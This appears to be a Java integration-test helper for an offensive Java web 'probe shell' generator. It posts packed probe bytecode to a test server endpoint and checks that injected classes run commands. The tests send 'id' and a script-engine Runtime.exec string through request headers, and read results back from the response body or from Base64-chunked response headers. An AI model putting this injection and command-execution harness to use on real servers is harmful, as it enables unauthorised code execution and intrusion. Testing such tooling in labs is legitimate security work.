package com.reajason.javaweb.integration;

import com.reajason.javaweb.integration.probe.DetectionTool;
import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseConfig;
import lombok.SneakyThrows;
import okhttp3.*;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;

/**
 * @author ReaJason
 * @since 2025/8/8
 */
public class ProbeAssertion {

    private static ClassPackerConfig toPackerConfig(ProbeShellResult result) {
        return ClassPackerConfig.of(result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
                result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule());
    }

    @SneakyThrows
    public static void responseBytecodeIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Bytecode)
                .targetJreVersion(targetJreVersion)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .build();
        String reqParamName = "payload";
        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(server)
                .reqParamName(reqParamName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(toPackerConfig(probeResult)))
                .add(reqParamName, DetectionTool.getServerDetection())
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Referer", url)
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertEquals(server, response.body().string());
        }
    }

    @SneakyThrows
    public static void responseBytecodeWithoutPrefixIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Bytecode)
                .targetJreVersion(targetJreVersion)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .build();
        String reqParamName = "payload";
        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(server)
                .reqParamName(reqParamName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(toPackerConfig(probeResult)))
                .add(reqParamName, DetectionTool.getServerDetection().replace("yv66vgAAAD", ""))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Referer", url)
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertEquals(server, response.body().string());
        }
    }

    @SneakyThrows
    public static void responseCommandIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Command)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .targetJreVersion(targetJreVersion)
                .build();
        String headerName = "X-Header-CMD";
        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(server)
                .reqParamName(headerName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(toPackerConfig(probeResult)))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header(headerName, "id")
                .header("Referer", url)
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }

    @SneakyThrows
    public static void responseScriptEngineIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.ScriptEngine)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .targetJreVersion(targetJreVersion)
                .build();
        String headerName = "X-Header-Script";
        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(server)
                .reqParamName(headerName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(toPackerConfig(probeResult)))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Referer", url)
                .header(headerName, "new java.util.Scanner(java.lang.Runtime.getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()")
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }

    /**
     * ResponseHeader 短结果：≤1500 字符原文写进单个响应头，响应体不能被写入命令结果。
     */
    @SneakyThrows
    public static void responseHeaderCommandIsOk(String url, String server, int targetJreVersion) {
        String triggerHeader = "X-Header-CMD";
        String resultHeader = "X-Probe-Result";
        ProbeShellResult probeResult = generateHeaderProbe(server, targetJreVersion, triggerHeader, resultHeader);

        try (Response response = executeProbe(url, probeResult, triggerHeader, "id")) {
            String body = response.body().string();
            assertFalse(body.contains("uid="), "ResponseHeader must not fall back to the response body: " + body);
            assertNull(response.header(resultHeader + "-E"), "short result should be plain text");
            assertThat(response.header(resultHeader), containsString("uid="));
        }
    }

    /**
     * ResponseHeader 长结果：Base64 后切分到多个响应头，附加 -E/-C 元信息。
     */
    @SneakyThrows
    public static void responseHeaderCommandChunkedIsOk(String url, String server, int targetJreVersion) {
        String triggerHeader = "X-Header-CMD";
        String resultHeader = "X-Probe-Result";
        ProbeShellResult probeResult = generateHeaderProbe(server, targetJreVersion, triggerHeader, resultHeader);
        // 只用 shell 内建命令生成 >1500 字符，避免依赖目标容器里的 seq/head 等外部命令
        String command = "i=0; while [ $i -lt 40 ]; do echo memparty-0123456789012345678901234567890123456789; i=$((i+1)); done";

        try (Response response = executeProbe(url, probeResult, triggerHeader, command)) {
            String body = response.body().string();
            assertFalse(body.contains("memparty-"), "ResponseHeader must not fall back to the response body: " + body);
            assertEquals("b64", response.header(resultHeader + "-E"));
            assertEquals("2", response.header(resultHeader + "-C"));
            assertNull(response.header(resultHeader + "-T"), "test result should not be truncated");
            assertThat(readHeaderResult(response, resultHeader), containsString("memparty-0123456789"));
        }
    }

    private static ProbeShellResult generateHeaderProbe(String server, int targetJreVersion,
                                                        String triggerHeader, String resultHeader) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseHeader)
                .probeContent(ProbeContent.Command)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .targetJreVersion(targetJreVersion)
                .build();
        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(server)
                .reqParamName(triggerHeader)
                .respHeaderName(resultHeader)
                .build();
        return ProbeShellGenerator.generate(probeConfig, responseConfig);
    }

    @SneakyThrows
    private static Response executeProbe(String url, ProbeShellResult probeResult,
                                         String triggerHeader, String command) {
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(toPackerConfig(probeResult)))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header(triggerHeader, command)
                .header("Referer", url)
                .url(url + "/biginteger").post(requestBody)
                .build();
        return new OkHttpClient().newCall(request).execute();
    }

    /**
     * 按生成器约定的编码规则还原响应头结果：短结果原文；长结果收集 X-Name、X-Name-2… 后 Base64 解码。
     */
    private static String readHeaderResult(Response response, String headerName) {
        String encoding = response.header(headerName + "-E");
        String first = response.header(headerName);
        if (!"b64".equals(encoding)) {
            return first;
        }
        assertNotNull(first, "missing header " + headerName);
        StringBuilder encoded = new StringBuilder(first);
        for (int i = 2; ; i++) {
            String chunk = response.header(headerName + "-" + i);
            if (chunk == null) {
                break;
            }
            encoded.append(chunk);
        }
        return new String(Base64.getDecoder().decode(encoded.toString()), StandardCharsets.UTF_8);
    }

    public static List<String> getFiltersForContext(String probeData, String contextPath) {
        List<String> filters = new ArrayList<>();
        String[] lines = probeData.split("\n");
        boolean inTargetContext = false;

        for (String line : lines) {
            line = line.trim();

            if (line.startsWith("Context:")) {
                inTargetContext = line.contains("(" + contextPath + ")");
            } else if (inTargetContext) {
                if (line.isEmpty() || line.startsWith("Context:")) {
                    break;
                }
                if (line.equals("No filters found")) {
                    break;
                }
                if (line.contains(" -> ")) {
                    filters.add(line);
                }
            }
        }

        return filters;
    }

    public static String extractFilterName(String filterLine) {
        if (filterLine == null || filterLine.isEmpty()) {
            return "";
        }
        int arrowIndex = filterLine.indexOf(" ->");
        if (arrowIndex > 0) {
            return filterLine.substring(0, arrowIndex).trim();
        }
        return filterLine.trim();
    }
}
